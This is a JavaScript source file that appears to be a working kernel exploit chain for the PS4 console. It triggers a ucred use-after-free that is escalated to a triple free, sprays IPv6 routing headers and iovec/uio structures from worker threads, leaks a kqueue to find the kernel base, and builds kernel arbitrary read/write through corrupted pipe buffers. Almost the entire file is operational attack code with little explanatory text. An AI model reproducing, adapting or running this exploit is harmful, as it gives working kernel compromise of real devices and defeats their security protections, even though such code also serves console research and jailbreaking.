//#region Variables
const NUM_ATTEMPT = 8;
const NUM_IOV_WORKER = 4;
const NUM_UIO_WORKER = 4;
const NUM_IPV6_SOCK = 0x100;
const NUM_ATTEMPT_TWINS = 0x10;
const NUM_ATTEMPT_TRIPLETS = 0x10;
const NUM_IOV_SPRAY = 0x100;
const NUM_UIO_SPRAY = 0x100;
const NUM_LEAK_KQUEUE = 0x200;
//#endregion
//#region Contants
const NETCONTROL_NETEVENT_SET_QUEUE = 0x20000003;
const NETCONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;

const UIO_READ = 0;
const UIO_WRITE = 1;
const UIO_SYSSPACE = 1;

const NUM_UIO_IOV = 0x14;
const NUM_MSG_IOV = 0x17;

const iov_ss = new Array(2);
const uio_ss = new Array(2);
const twins = new Array(2);
const triplets = new Array(3);
const ipv6_socks = new Array(NUM_IPV6_SOCK);
const iov_workers = new Array(NUM_IOV_WORKER);
const iov_tasks = new Array(NUM_IOV_WORKER);
const uio_workers = new Array(NUM_UIO_WORKER);
const uio_tasks = new Array(NUM_UIO_WORKER);

let msg = undefined;
let msg_iov = undefined;
let msg_uio = undefined;
let uio_iov_read = undefined;
let uio_iov_write = undefined;

let uaf_sock = 0;

let kl_lock = undefined;
let kq_fdp = undefined;

let tmp = undefined;

fn.netcontrol = new NativeFunction(0x63, "number");
fn.socketpair = new NativeFunction(0x87, "number");
fn.sendmsg = new NativeFunction(0x1c, "bint");
fn.kqueue = new NativeFunction(0x16a, "number");
//#endregion
//#region Functions
function netcontrol_netevent(sock, event) {
  const size = 8;
  const addr = mem.alloc(size);
  arw.view(addr).setInt32(0, sock, true);

  if (fn.netcontrol.invoke(-1, event, addr, size) === -1) {
    throw new SyscallError(`Unable to queue ${sock} in netevent !!`);
  }
}

async function spawn_iov_workers() {
  logger.debug("Spawn iov workers...");

  for (let i = 0; i < iov_workers.length; i++) {
    iov_workers[i] = new RPCWorker(`iov_worker_${i}`);
    await iov_workers[i].init();
    await iov_workers[i].execute(
      "register",
      "kinit",
      `() => {
        switch (version.console) {
          case 4:
            importScripts("ps4/kernel.js");
            break;
          case 5:
            //TODO
            break;
          default:
            logger.info(\`Unsupported console \${version.console}\`);
        }

        pin_to_core(MAIN_CORE);
        set_rtprio(RTP);

        fn.recvmsg = new NativeFunction(0x1B, "bint");

        return true;
      }`,
    );
    await iov_workers[i].execute(
      "register",
      "recvmsg",
      `(iov_ss, msg_addr) => {
        msg_addr = new BInt(msg_addr);

        fn.recvmsg.invoke(iov_ss[0], msg_addr, 0);

        return true;
      }`,
    );

    await iov_workers[i].execute("kinit");
  }

  logger.debug("iov workers spawned !!");
}

async function spawn_uio_workers() {
  logger.debug("Spawn uio workers...");

  for (let i = 0; i < uio_workers.length; i++) {
    uio_workers[i] = new RPCWorker(`uio_worker_${i}`);
    await uio_workers[i].init();
    await uio_workers[i].execute(
      "register",
      "kinit",
      `() => {
        switch (version.console) {
          case 4:
            importScripts("ps4/kernel.js");
            break;
          case 5:
            //TODO
            break;
          default:
            logger.info(\`Unsupported console \${version.console}\`);
        }

        pin_to_core(MAIN_CORE);
        set_rtprio(RTP);

        UIO_IOV_NUM = 0x14;
        fn.readv = new NativeFunction(0x78, "bint");
        fn.writev = new NativeFunction(0x79, "bint");

        return true;
      }`,
    );
    await uio_workers[i].execute(
      "register",
      "uio_read",
      `(uio_ss, read_addr) => {
        read_addr = new BInt(read_addr);

        if (fn.writev.invoke(uio_ss[1], read_addr, UIO_IOV_NUM).eq(-1)) {
          throw new SyscallError(\`Unable to write vector of size \${UIO_IOV_NUM} to fd \${uio_ss[1]} !!\`);
        }

        return true;
      }`,
    );
    await uio_workers[i].execute(
      "register",
      "uio_write",
      `(uio_ss, write_addr) => {
        write_addr = new BInt(write_addr);

        if (fn.readv.invoke(uio_ss[0], write_addr, UIO_IOV_NUM).eq(-1)) {
          throw new SyscallError(\`Unable to read vector of size \${UIO_IOV_NUM} to fd \${uio_ss[0]} !!\`);
        }

        return true;
      }`,
    );

    await uio_workers[i].execute("kinit");
  }

  logger.debug("uio workers spawned !!");
}

function stop_iov_workers() {
  for (const iov_worker of iov_workers) {
    if (iov_worker === undefined) {
      continue;
    }

    logger.debug(`terminate worker ${iov_worker.name}...`);

    iov_worker.terminate();

    logger.debug(`${iov_worker.name} worker terminated !!`);
  }
}

function stop_uio_workers() {
  for (const uio_worker of uio_workers) {
    if (uio_worker === undefined) {
      continue;
    }

    logger.debug(`terminate worker ${uio_worker.name}...`);

    uio_worker.terminate();

    logger.debug(`${uio_worker.name} worker terminated !!`);
  }
}

function find_twins() {
  logger.info("Looking for twins...");

  for (let i = 0; i < NUM_ATTEMPT_TWINS; i++) {
    for (let i = 0; i < ipv6_socks.length; i++) {
      arw.view(spray_rthdr0_addr).setInt32(4, i, true); // ip6_rthdr0.ip6r0_reserved

      set_rthdr(ipv6_socks[i]);
    }

    for (let i = 0; i < ipv6_socks.length; i++) {
      get_rthdr(ipv6_socks[i], ip6_rthdr0.sizeof);

      const idx = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
      if (idx !== i) {
        logger.debug(`Found twins after ${i} iterations !!`);

        twins[0] = ipv6_socks[i];
        twins[1] = ipv6_socks[idx];

        return;
      }
    }
  }

  throw new Error("Unable to find twins !!");
}

function find_triplet(master, slave) {
  for (let i = 0; i < NUM_ATTEMPT_TRIPLETS; i++) {
    for (let i = 0; i < ipv6_socks.length; i++) {
      if (ipv6_socks[i] === master || ipv6_socks[i] === slave) {
        continue;
      }

      arw.view(spray_rthdr0_addr).setInt32(4, i, true); // ip6_rthdr0.ip6r0_reserved

      set_rthdr(ipv6_socks[i]);
    }

    get_rthdr(master, ip6_rthdr0.sizeof);

    const idx = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
    if (ipv6_socks[idx] !== master && ipv6_socks[idx] !== slave) {
      logger.debug(`Found triplet after ${i} iterations !!`);
      return ipv6_socks[idx];
    }
  }

  throw new Error("Unable to find triplet !!");
}

function init() {
  logger.info("Environment init started...");

  pin_to_core(MAIN_CORE);
  set_rtprio(RTP);

  // Prepare spray/leak rthdr0
  spray_rthdr0_addr = mem.alloc(UCRED_SIZE);
  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, UCRED_SIZE);

  leak_rthdr0_addr = mem.alloc(UCRED_SIZE);

  // Prepare msg iov
  const msg_iov_addr = mem.alloc(iovec.sizeof * NUM_MSG_IOV);
  msg_iov = iovec.new(msg_iov_addr);
  msg_uio = uio.new(msg_iov_addr);

  msg = msghdr.new();

  msg.msg_iov = msg_iov.addr;
  msg.msg_iovlen = NUM_MSG_IOV;

  const uio_iov_addr = mem.alloc(iovec.sizeof * NUM_UIO_IOV);
  uio_iov_read = iovec.new(uio_iov_addr);
  uio_iov_write = iovec.new(uio_iov_addr);

  const dummy_size = 0x1000;
  const dummy_addr = mem.alloc(dummy_size);

  mem.bset(dummy_addr, dummy_size, 0x41);

  uio_iov_read.iov_base = dummy_addr;
  uio_iov_write.iov_base = dummy_addr;

  // Prepare temp buffer
  tmp = mem.alloc(PAGE_SIZE);

  logger.info("Environment init completed !!");
}

async function setup() {
  logger.info("Environment setup started...");

  make_karw_pipe();

  const pair_addr = mem.alloc(8);

  // Create socket pair for iov spraying
  if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
    throw new SyscallError("Unable to create socket pair !!");
  }

  iov_ss[0] = arw.view(pair_addr).getInt32(0, true);
  iov_ss[1] = arw.view(pair_addr).getInt32(4, true);

  // Create socket pair for uio spraying
  if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
    throw new SyscallError("Unable to create socket pair !!");
  }

  uio_ss[0] = arw.view(pair_addr).getInt32(0, true);
  uio_ss[1] = arw.view(pair_addr).getInt32(4, true);

  logger.debug(`iov_ss: ${iov_ss}`);
  logger.debug(`uio_ss: ${uio_ss}`);

  mem.free(pair_addr);

  // Setup sockets for spraying and initialize pktopts
  for (let i = 0; i < ipv6_socks.length; i++) {
    ipv6_socks[i] = make_socket(AF_INET6, SOCK_STREAM);
  }

  await spawn_iov_workers();
  await spawn_uio_workers();

  logger.info("Environment setup completed !!");
}

function cleanup() {
  logger.info("Environment cleanup started...");

  if (uaf_sock !== 0) {
    if (fn.close.invoke(uaf_sock) === -1) {
      throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);
    }

    uaf_sock = 0;
  }

  for (const sock of iov_ss) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  for (const sock of uio_ss) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  for (const sock of ipv6_socks) {
    if (sock === 0) {
      continue;
    }

    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  free_karw_pipe();

  stop_iov_workers();
  stop_uio_workers();

  if (msg_iov !== undefined) {
    mem.free(msg_iov.addr);
  }
  if (msg_uio !== undefined) {
    mem.free(msg_uio.addr);
  }
  if (msg !== undefined) {
    mem.free(msg.addr);
  }
  if (tmp !== undefined) {
    mem.free(tmp.addr);
  }

  mem.free(spray_rthdr0_addr);
  mem.free(leak_rthdr0_addr);

  logger.info("Environment cleanup completed !!");
}

async function ucred_triple_free() {
  logger.info("Ucred double free started...");

  // Prepare msg iov spray. Set 1 as iov_base as it will be interpreted as cr_refcnt
  msg_iov.iov_base = 1;
  msg_iov.iov_len = 1;

  for (let i = 0; i < NUM_ATTEMPT; i++) {
    try {
      // Create dummy socket to be registered and then closed
      const dummy_sock = make_socket(AF_UNIX, SOCK_STREAM);
      logger.debug(`dummy_sock: ${dummy_sock}`);

      // Register dummy socket
      netcontrol_netevent(dummy_sock, NETCONTROL_NETEVENT_SET_QUEUE);

      // Close the dummy socket
      if (fn.close.invoke(dummy_sock) === -1) {
        throw new SyscallError(`Unable to close fd ${dummy_sock} !!`);
      }

      // Allocate a new ucred
      if (fn.setuid.invoke(1) === -1) {
        throw new SyscallError("Unable to set uid to 1 !!");
      }

      // Reclaim dummy_sock fd
      uaf_sock = make_socket(AF_UNIX, SOCK_STREAM);
      logger.debug(`uaf_sock: ${uaf_sock}`);

      if (uaf_sock !== dummy_sock) {
        throw new Error(`Unable to reclaim fd ${dummy_sock} !!`);
      }

      // Free the previous ucred. Now uaf_sock's cr_refcnt of f_cred is 1
      if (fn.setuid.invoke(1) === -1) {
        throw new SyscallError("Unable to set uid to 1 !!");
      }

      // Unregister dummy socket and free the file and ucred
      netcontrol_netevent(uaf_sock, NETCONTROL_NETEVENT_CLEAR_QUEUE);

      logger.info(`Attempt to set cr_refcnt back to 1 started...`);

      // Set cr_refcnt back to 1
      for (let i = 0; i < 0x80; i++) {
        fn.sendmsg.invoke(0, msg.addr, 0);
      }

      // Double free ucred.
      // Note: Only dup works because it does not check fhold
      let uaf_sock_dup = fn.dup.invoke(uaf_sock);
      if (uaf_sock_dup === -1) {
        throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);
      }

      if (fn.close.invoke(uaf_sock_dup) === -1) {
        throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
      }

      // Find twins
      find_twins();

      logger.info(`Found twins: ${twins} !!`);

      logger.info(`Ucred double free achieved !!`);

      logger.info("Ucred triple free started...");

      logger.info(`Attempt to set cr_refcnt back to 1 started...`);

      // Free one
      free_rthdr(twins[1]);

      logger.debug("Signaling work to iov workers...");

      let reclaimed = false;

      // Set cr_refcnt back to 1
      for (let i = 0; i < NUM_IOV_SPRAY; i++) {
        // Reclaim with iov
        for (let i = 0; i < iov_tasks.length; i++) {
          iov_tasks[i] = iov_workers[i].execute("recvmsg", iov_ss, msg.addr);
        }

        if (fn.sched_yield.invoke() === -1) {
          throw new SyscallError("Unable to yield scheduler !!");
        }

        get_rthdr(twins[0], ip6_rthdr0.sizeof);

        const cr_refcnt = arw.view(leak_rthdr0_addr).getInt32(0, true);
        if (cr_refcnt === 1) {
          logger.debug(`Set cr_refcnt back to 1 after ${i} iterations !!`);
          reclaimed = true;
          break;
        }

        // Release iov spray
        if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
          throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
        }

        await Promise.all(iov_tasks);

        if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
          throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
        }
      }

      logger.debug("iov workers work done !!");

      if (!reclaimed) {
        throw new Error("Unable to set cr_refcnt back to 1 !!");
      }

      logger.info(`Set cr_refcnt back to 1 !!`);

      // Triple free ucred.
      uaf_sock_dup = fn.dup.invoke(uaf_sock);
      if (uaf_sock_dup === -1) {
        throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);
      }

      if (fn.close.invoke(uaf_sock_dup) === -1) {
        throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
      }

      logger.info("Looking for triplets...");

      triplets[0] = twins[0];
      triplets[1] = find_triplet(triplets[0], -1);

      // Release iov spray
      if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
        throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
      }

      triplets[2] = find_triplet(triplets[0], triplets[1]);

      await Promise.all(iov_tasks);

      if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
        throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
      }

      logger.info(`Found triplet: ${triplets} !!`);

      logger.info(`Ucred triple free achieved !!`);

      break;
    } catch (err) {
      if (err.name === "SyscallError") {
        throw err;
      }

      logger.info(`[${i + 1}/${NUM_ATTEMPT}] ${err.message}\n${err.stack}`);

      if (i + 1 === NUM_ATTEMPT) {
        throw new Error("Unable to ucred triple free !!");
      }

      logger.info("Reattempt...");

      if (uaf_sock !== 0) {
        if (fn.close.invoke(uaf_sock) === -1) {
          throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);
        }

        uaf_sock = 0;
      }
    }
  }
}

function leak_kqueue() {
  logger.info("Leak kqueue started...");

  // Free one
  free_rthdr(triplets[2]);

  let kq;
  let leaked = false;
  for (let i = 0; i < NUM_LEAK_KQUEUE; i++) {
    kq = fn.kqueue.invoke();
    if (kq === -1) {
      throw new SyscallError("Unable to get kqueue !!");
    }

    get_rthdr(triplets[0], KQUEUE_SIZE);

    const kq_hdr = arw.view(leak_rthdr0_addr).getBInt(8, true);
    if (kq_hdr.eq(0x1430000)) {
      logger.debug(`Leaked kqueue after ${i} iterations !!`);
      leaked = true;
      break;
    }

    if (fn.close.invoke(kq) === -1) {
      throw new SyscallError(`Unable to close fd ${kq} !!`);
    }
  }

  if (!leaked) {
    throw new Error("Unable to leak kqueue !!");
  }

  logger.info("Leaked kqueue !!");

  kl_lock = arw.view(leak_rthdr0_addr).getBInt(0x60, true);
  kq_fdp = arw.view(leak_rthdr0_addr).getBInt(0x98, true);
  kernel_base = kl_lock.sub(constants.KL_LOCK);

  logger.debug(`kq_fdp: ${kq_fdp}`);
  logger.debug(`kl_lock: ${kl_lock}`);

  logger.info(`kernel base: ${kernel_base}`);

  // Close kqueue to free buffer
  if (fn.close.invoke(kq) === -1) {
    throw new SyscallError(`Unable to close fd ${kq} !!`);
  }

  triplets[2] = find_triplet(triplets[0], triplets[1]);

  logger.debug(`Found triplet: ${triplets} !!`);

  logger.info("Leak kqueue completed !!");
}

async function kread_slow(addr, size) {
  // Prepare leak buffers
  const leak_bufs = new Array(uio_workers.length);
  for (let i = 0; i < leak_bufs.length; i++) {
    leak_bufs[i] = mem.alloc(size);
  }

  // Set send buf size
  const buf_size_addr = mem.alloc(4);

  arw.view(buf_size_addr).setInt32(0, size, true);

  if (fn.setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_size_addr, 4) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
  }

  mem.free(buf_size_addr);

  // Fill queue
  if (fn.write.invoke(uio_ss[1], tmp, size).eq(-1)) {
    throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
  }

  // Set iov length
  uio_iov_read.iov_len = size;

  // Free one
  free_rthdr(triplets[2]);

  logger.debug("Signaling work to uio workers...");

  let reclaimed = false;

  // Reclaim with uio
  for (let i = 0; i < NUM_UIO_SPRAY; i++) {
    for (let i = 0; i < uio_tasks.length; i++) {
      uio_tasks[i] = uio_workers[i].execute("uio_read", uio_ss, uio_iov_read.addr);
    }

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError("Unable to yield scheduler !!");
    }

    // Leak with other rthdr
    get_rthdr(triplets[0], iovec.sizeof);

    const iov_len = arw.view(leak_rthdr0_addr).getInt32(8, true);
    if (iov_len === NUM_UIO_IOV) {
      logger.debug(`Reclaim with uio after ${i} iterations !!`);
      reclaimed = true;
      break;
    }

    // Wake up all workers
    if (fn.read.invoke(uio_ss[0], tmp, size).eq(-1)) {
      throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
    }

    for (let i = 0; i < leak_bufs.length; i++) {
      if (fn.read.invoke(uio_ss[0], leak_bufs[i], size).eq(-1)) {
        throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
      }
    }

    await Promise.all(uio_tasks);

    // Fill queue
    if (fn.write.invoke(uio_ss[1], tmp, size).eq(-1)) {
      throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
    }
  }

  logger.debug("uio workers work done !!");

  if (!reclaimed) {
    throw new Error("Unable to reclaim with uio !!");
  }

  const uio_iov = arw.view(leak_rthdr0_addr).getBInt(0, true);

  // Prepare uio reclaim buffer
  msg_uio.uio_iov = uio_iov;
  msg_uio.uio_iovcnt = NUM_UIO_IOV;
  msg_uio.uio_offset = -1;
  msg_uio.uio_resid = uio_iov_read.iov_len;
  msg_uio.uio_segflg = UIO_SYSSPACE;
  msg_uio.uio_rw = UIO_WRITE;
  msg_uio.uio_td = 0;

  msg_iov[3].iov_base = addr;
  msg_iov[3].iov_len = uio_iov_read.iov_len;

  // Free second one
  free_rthdr(triplets[1]);

  logger.debug("Signaling work to iov workers...");

  reclaimed = false;

  // Reclaim uio with iov
  for (let i = 0; i < NUM_IOV_SPRAY; i++) {
    // Reclaim with iov
    for (let i = 0; i < iov_tasks.length; i++) {
      iov_tasks[i] = iov_workers[i].execute("recvmsg", iov_ss, msg.addr);
    }

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError("Unable to yield scheduler !!");
    }

    // Leak with other rthdr
    get_rthdr(triplets[0], uio.sizeof + iovec.sizeof);

    const uio_segflg = arw.view(leak_rthdr0_addr).getInt32(0x20, true);
    if (uio_segflg === UIO_SYSSPACE) {
      logger.debug(`Reclaim uio with iov after ${i} iterations !!`);
      reclaimed = true;
      break;
    }

    // Release iov spray
    if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
      throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
    }

    await Promise.all(iov_tasks);

    if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
      throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
    }
  }

  logger.debug("iov workers work done !!");

  if (!reclaimed) {
    throw new Error("Unable to reclaim uio with iov !!");
  }

  // Wake up all workers
  if (fn.read.invoke(uio_ss[0], tmp, size).eq(-1)) {
    throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
  }

  // Read the results now
  let leak_buf;

  // Get leak
  const spray_val = new BInt("0x4141414141414141");
  for (let i = 0; i < leak_bufs.length; i++) {
    if (fn.read.invoke(uio_ss[0], leak_bufs[i], size).eq(-1)) {
      throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
    }

    const val = arw.view(leak_bufs[i]).getBInt(0, true);
    if (val.neq(spray_val)) {
      triplets[1] = find_triplet(triplets[0], -1);

      leak_buf = leak_bufs[i];
      continue;
    }

    mem.free(leak_bufs[i]);
  }

  await Promise.all(uio_tasks);

  // Release iov spray
  if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
    throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
  }

  triplets[2] = find_triplet(triplets[0], triplets[1]);

  await Promise.all(iov_tasks);

  if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
    throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
  }

  logger.debug(`Found triplet: ${triplets} !!`);

  if (typeof leak_buf === "undefined") {
    throw new Error(`Unable to kread ${addr} !!`);
  }

  return leak_buf;
}

async function kwrite_slow(dst, src, size) {
  // Set send buf size
  const buf_size_addr = mem.alloc(4);

  arw.view(buf_size_addr).setInt32(0, size, true);

  if (fn.setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_size_addr, 4) === -1) {
    throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
  }

  mem.free(buf_size_addr);

  // Set iov length
  uio_iov_write.iov_len = size;

  // Free one
  free_rthdr(triplets[2]);

  logger.debug("Signaling work to uio workers...");

  let reclaimed = false;

  // Reclaim with uio
  for (let i = 0; i < NUM_UIO_SPRAY; i++) {
    for (let i = 0; i < uio_tasks.length; i++) {
      uio_tasks[i] = uio_workers[i].execute("uio_write", uio_ss, uio_iov_write.addr);
    }

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError("Unable to yield scheduler !!");
    }

    // Leak with other rthdr
    get_rthdr(triplets[0], iovec.sizeof);

    const iov_len = arw.view(leak_rthdr0_addr).getInt32(8, true);
    if (iov_len === NUM_UIO_IOV) {
      logger.debug(`Reclaim with uio after ${i} iterations !!`);
      reclaimed = true;
      break;
    }

    // Wake up all workers
    for (let i = 0; i < uio_workers.length; i++) {
      if (fn.write.invoke(uio_ss[1], src, size).eq(-1)) {
        throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
      }
    }

    await Promise.all(uio_tasks);
  }

  logger.debug("uio workers work done !!");

  if (!reclaimed) {
    throw new Error("Unable to reclaim with uio !!");
  }

  const uio_iov = arw.view(leak_rthdr0_addr).getBInt(0, true);

  // Prepare uio reclaim buffer
  msg_uio.uio_iov = uio_iov;
  msg_uio.uio_iovcnt = NUM_UIO_IOV;
  msg_uio.uio_offset = -1;
  msg_uio.uio_resid = uio_iov_write.iov_len;
  msg_uio.uio_segflg = UIO_SYSSPACE;
  msg_uio.uio_rw = UIO_READ;
  msg_uio.uio_td = 0;

  msg_iov[3].iov_base = dst;
  msg_iov[3].iov_len = uio_iov_write.iov_len;

  // Free second one
  free_rthdr(triplets[1]);

  logger.debug("Signaling work to iov workers...");

  reclaimed = false;

  // Reclaim uio with iov
  for (let i = 0; i < NUM_IOV_SPRAY; i++) {
    // Reclaim with iov
    for (let i = 0; i < iov_tasks.length; i++) {
      iov_tasks[i] = iov_workers[i].execute("recvmsg", iov_ss, msg.addr);
    }

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError("Unable to yield scheduler !!");
    }

    // Leak with other rthdr
    get_rthdr(triplets[0], uio.sizeof + iovec.sizeof);

    const uio_segflg = arw.view(leak_rthdr0_addr).getInt32(0x20, true);
    if (uio_segflg === UIO_SYSSPACE) {
      logger.debug(`Reclaim uio with iov after ${i} iterations !!`);
      reclaimed = true;
      break;
    }

    // Release iov spray
    if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
      throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
    }

    await Promise.all(iov_tasks);

    if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
      throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
    }
  }

  logger.debug("iov workers work done !!");

  if (!reclaimed) {
    throw new Error("Unable to reclaim uio with iov !!");
  }

  // Corrupt data
  for (let i = 0; i < uio_workers.length; i++) {
    if (fn.write.invoke(uio_ss[1], src, size).eq(-1)) {
      throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
    }
  }

  triplets[1] = find_triplet(triplets[0], -1);

  await Promise.all(uio_tasks);

  // Release iov spray
  if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
    throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
  }

  triplets[2] = find_triplet(triplets[0], triplets[1]);

  await Promise.all(iov_tasks);

  if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
    throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
  }

  logger.debug(`Found triplet: ${triplets} !!`);
}

async function kread8_slow(addr) {
  const leak_buf = await kread_slow(addr, 8);
  return arw.view(leak_buf).getBInt(0, true);
}

function remove_uaf_file() {
  const uaf_fp = fget(uaf_sock);
  logger.debug(`uaf_fp: ${uaf_fp}`);

  // Remove uaf sock
  fput(uaf_sock, 0);
  uaf_sock = 0;

  let removed = 0;
  // Remove triple freed file from uaf sock
  for (let i = 0; i < 0x100; i++) {
    const sock = make_socket(AF_UNIX, SOCK_STREAM);

    if (fget(sock).eq(uaf_fp)) {
      logger.debug(`reclaimed uaf fp with fd ${sock}, removing...`);
      fput(sock, 0);
      removed++;
    }

    fn.close.invoke(sock);

    if (removed === 3) {
      logger.info(`cleaned up uaf fp after ${i} iterations !!`);
      break;
    }
  }
}

async function make_karw() {
  logger.info("Initiate kernel ARW...");

  fdt_ofiles = await kread8_slow(kq_fdp);
  logger.debug(`fdt_ofiles: ${fdt_ofiles}`);

  const master_pipe_fp = await kread8_slow(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
  logger.debug(`master_pipe_fp: ${master_pipe_fp}`);

  const slave_pipe_fp = await kread8_slow(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
  logger.debug(`slave_pipe_fp: ${slave_pipe_fp}`);

  const master_pipe_f_data = await kread8_slow(master_pipe_fp);
  logger.debug(`master_pipe_f_data: ${master_pipe_f_data}`);

  const slave_pipe_f_data = await kread8_slow(slave_pipe_fp);
  logger.debug(`slave_pipe_f_data: ${slave_pipe_f_data}`);

  const pipe_buf = pipebuf.new();

  pipe_buf.cnt = 0;
  pipe_buf.in = 0;
  pipe_buf.out = 0;
  pipe_buf.size = PAGE_SIZE;
  pipe_buf.buffer = slave_pipe_f_data;

  await kwrite_slow(master_pipe_f_data, pipe_buf.addr, pipebuf.sizeof);

  mem.free(pipe_buf.addr);

  kv = new KernelView(master_pipe, slave_pipe);

  logger.info("Achieved kernel ARW !!");
}
//#endregion
//#region Structs
const iovec = new Struct("iovec", [
  { type: "Uint64", name: "iov_base" },
  { type: "Uint64", name: "iov_len" },
]);

const msghdr = new Struct("msghdr", [
  { type: "Uint64", name: "msg_name" },
  { type: "Uint32", name: "msg_namelen" },
  { type: "iovec*", name: "msg_iov" },
  { type: "Int32", name: "msg_iovlen" },
  { type: "Uint64", name: "msg_control" },
  { type: "Uint32", name: "msg_controllen" },
  { type: "Int32", name: "msg_flags" },
]);

const uio = new Struct("uio", [
  { type: "Uint64", name: "uio_iov" },
  { type: "Uint32", name: "uio_iovcnt" },
  { type: "Uint64", name: "uio_offset" },
  { type: "Uint64", name: "uio_resid" },
  { type: "Uint32", name: "uio_segflg" },
  { type: "Uint32", name: "uio_rw" },
  { type: "Uint64", name: "uio_td" },
]);
//#endregion
